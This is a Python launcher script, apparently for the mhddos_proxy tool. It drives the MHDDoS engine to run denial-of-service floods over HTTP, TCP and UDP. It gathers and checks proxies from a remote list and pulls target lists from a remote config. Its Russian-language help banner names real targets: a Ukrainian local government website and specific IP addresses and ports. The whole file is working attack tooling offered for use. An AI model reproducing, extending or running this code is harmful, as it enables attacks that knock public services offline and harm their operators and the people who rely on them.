import argparse
import os
import random
import subprocess
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from multiprocessing import cpu_count

import requests
from MHDDoS.start import logger
from PyRoxy import ProxyType, Proxy


PROXIES_URL = 'https://raw.githubusercontent.com/porthole-ascend-cinnamon/proxy_scraper/main/proxies.txt'
PROXY_TIMEOUT = 5
UDP_THREADS = 1
LOW_RPC = 1000

THREADS_PER_CORE = 1000
MAX_DEFAULT_THREADS = 4000


class Targets:
    def __init__(self, targets, config):
        self.targets = targets
        self.config = config
        self.config_targets = []

    def __iter__(self):
        self.load_config()
        for target in self.targets + self.config_targets:
            yield self.prepare_target(target)

    def prepare_target(self, target):
        if '://' in target:
            return target

        try:
            _, port = target.split(':', 1)
        except ValueError:
            port = '80'

        scheme = 'https://' if port == '443' else 'http://'
        return scheme + target

    def load_config(self):
        if not self.config:
            return

        try:
            config_content = requests.get(self.config, timeout=5).text
        except requests.RequestException:
            logger.warning('Не удалось загрузить новую конфигурацию, переходим к последней известной правильной конфигурации')
        else:
            self.config_targets = [
                target.strip()
                for target in config_content.split()
                if target.strip()
            ]


def download_proxies():
    response = requests.get(PROXIES_URL, timeout=10)
    for line in response.iter_lines(decode_unicode=True):
        yield Proxy.fromString(line)


def update_proxies(period, targets):
    #  Avoid parsing proxies too often when restart happens
    if os.path.exists('files/proxies/proxies.txt'):
        last_update = os.path.getmtime('files/proxies/proxies.txt')
        if (time.time() - last_update) < period / 2:
            return

    Proxies = list(download_proxies())
    random.shuffle(Proxies)

    size = len(targets)
    logger.info(f'{len(Proxies):, прокси проверяется на работоспособность - это может занять пару минут:} ')

    future_to_proxy = {}
    with ThreadPoolExecutor(THREADS_PER_CORE) as executor:
        for target, chunk in zip(targets, (Proxies[i::size] for i in range(size))):
            future_to_proxy.update({
                executor.submit(proxy.check, target, PROXY_TIMEOUT): proxy
                for proxy in chunk
            })

        CheckedProxies = [
            future_to_proxy[future]
            for future in as_completed(future_to_proxy) if future.result()
        ]

    if not CheckedProxies:
        logger.error(
            ' Не найдено рабочих прокси.'
            ' Убедитесь что интернет соединение стабильное и цель доступна. '
            ' Перезапустите Docker.'
        )
        exit()

    os.makedirs('files/proxies/', exist_ok=True)
    with open('files/proxies/proxies.txt', "w") as all_wr, \
            open('files/proxies/socks4.txt', "w") as socks4_wr, \
            open('files/proxies/socks5.txt', "w") as socks5_wr:
        for proxy in CheckedProxies:
            proxy_string = str(proxy) + "\n"
            all_wr.write(proxy_string)
            if proxy.type == ProxyType.SOCKS4:
                socks4_wr.write(proxy_string)
            if proxy.type == ProxyType.SOCKS5:
                socks5_wr.write(proxy_string)


def run_ddos(targets, total_threads, period, rpc, http_methods, debug):
    threads_per_target = total_threads // len(targets)
    params_list = []
    for target in targets:
        # UDP
        if target.lower().startswith('udp://'):
            logger.warning(f'Убедитесь, что VPN включен - прокси-серверы не поддерживаются для целей UDP: {target}')
            params_list.append([
                'UDP', target[6:], str(UDP_THREADS), str(period)
            ])

        # TCP
        elif target.lower().startswith('tcp://'):
            for socks_type, socks_file in (('4', 'socks4.txt'), ('5', 'socks5.txt')):
                params_list.append([
                    'TCP', target[6:], str(threads_per_target // 2), str(period), socks_type, socks_file
                ])

        # HTTP(S)
        else:
            method = random.choice(http_methods)
            params_list.append([
                method, target, '0', str(threads_per_target), 'proxies.txt', str(rpc), str(period)
            ])

    processes = []
    for params in params_list:
        if debug:
            params.append('true')
        processes.append(
            subprocess.Popen([sys.executable, './start.py', *params])
        )

    for p in processes:
        p.wait()


def start(total_threads, period, targets, rpc, http_methods, debug):
    os.chdir('MHDDoS')
    while True:
        resolved = list(targets)
        if not resolved:
            logger.error('Необходимо предоставить либо целевые объекты, либо действительный конфигурационный файл')
            exit()

        if rpc < LOW_RPC:
            logger.warning(
                f'RPC менше чем {LOW_RPC}. Это может привести к снижению производительности'
                f'из-за увеличения количества переключений каждого потока между прокси.'
            )

        no_proxies = all(target.lower().startswith('udp://') for target in resolved)
        if not no_proxies:
            update_proxies(period, resolved)
        run_ddos(resolved, total_threads, period, rpc, http_methods, debug)


def init_argparse() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        'targets',
        nargs='*',
        help='Список целей, разделенных пробелами',
    )
    parser.add_argument(
        '-c',
        '--config',
        help='URL to a config file',
    )
    parser.add_argument(
        '-t',
        '--threads',
        type=int,
        default=min(THREADS_PER_CORE * cpu_count(), MAX_DEFAULT_THREADS),
        help='Общее количество выполняемых потоков (по умолчанию - CPU * 1000)',
    )
    parser.add_argument(
        '-p',
        '--period',
        type=int,
        default=900,
        help='Как часто обновлять прокси (в секундах) (по умолчанию 900)',
    )
    parser.add_argument(
        '--rpc',
        type=int,
        default=2000,
        help='Сколько запросов нужно отправить по одному прокси-соединению (по умолчанию 2000)',
    )
    parser.add_argument(
        '--debug',
        action='store_true',
        default=False,
        help='Включить вывод отладки из MHDDoS',
    )
    parser.add_argument(
        '--http-methods',
        nargs='+',
        default=['GET', 'POST', 'STRESS', 'BOT', 'PPS'],
        help='Список используемых методов атаки HTTP(ов). По умолчанию используется GET, POST, STRESS, BOT, PPS',
    )
    return parser


def print_banner():
    print('''\
                            !!!ВЫКЛЮЧИТЕ VPN!!! (Использовать только при атаке на UDP порты)
     (скрипт автоматически подбирает Прокси, VPN в данном случае мешает работе)

####### Все параметры можно комбинировать, можно указывать и до и после перечня целей. #######
Для Docker замените `python3 runner.py` на `docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest`

- Быстрый хелп по командам- `python3 runner.py --help` 
- Нагрузка - `-t XXXX` - количество потоков по умолчанию - CPU * 1000
    python3 runner.py -t 3000 https://brovary-rada.gov.ua	 tcp://194.54.14.131:22
- Информация о ходе атаки (режим отладки для понимания как идёт атака)' -- debug`
    python3 runner.py --debug https://brovary-rada.gov.ua	 tcp://194.54.14.131:22
- Частота обновления прокси (по умолчанию - каждые 15 минут) - `-p SECONDS`
    python3 runner.py -p 1200 https://brovary-rada.gov.ua	 tcp://194.54.14.131:22
# Варианты целей (первые три можно смешивать в одной команде)
- URL         https://brovary-rada.gov.ua	
- IP + PORT   5.188.56.124:3606
- TCP         tcp://194.54.14.131:22
- UDP         udp://217.175.155.100:53 - !!!ИСПОЛЬЗОВАТЬ ВПН!!!
    ''')


if __name__ == '__main__':
    args = init_argparse().parse_args()
    print_banner()
    start(
        args.threads,
        args.period,
        Targets(args.targets, args.config),
        args.rpc,
        args.http_methods,
        args.debug,
    )
